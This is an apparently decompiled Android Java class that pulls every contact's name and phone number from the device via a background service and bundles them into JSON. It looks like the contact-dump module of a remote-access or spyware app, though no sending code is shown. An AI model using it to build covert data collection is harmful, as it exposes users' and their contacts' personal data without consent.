package com.example.project20;

import android.database.Cursor;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactsManager {
    public static JSONObject getContacts() {
        try {
            JSONObject jSONObject = new JSONObject();
            JSONArray jSONArray = new JSONArray();
            Cursor query = MainService.getContextOfApplication().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"display_name", "data1"}, null, null, "display_name ASC");
            while (query.moveToNext()) {
                JSONObject jSONObject2 = new JSONObject();
                String string = query.getString(query.getColumnIndex("display_name"));
                jSONObject2.put("phoneNo", query.getString(query.getColumnIndex("data1")));
                jSONObject2.put("name", string);
                jSONArray.put(jSONObject2);
            }
            jSONObject.put("contactsList", jSONArray);
            return jSONObject;
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }
}
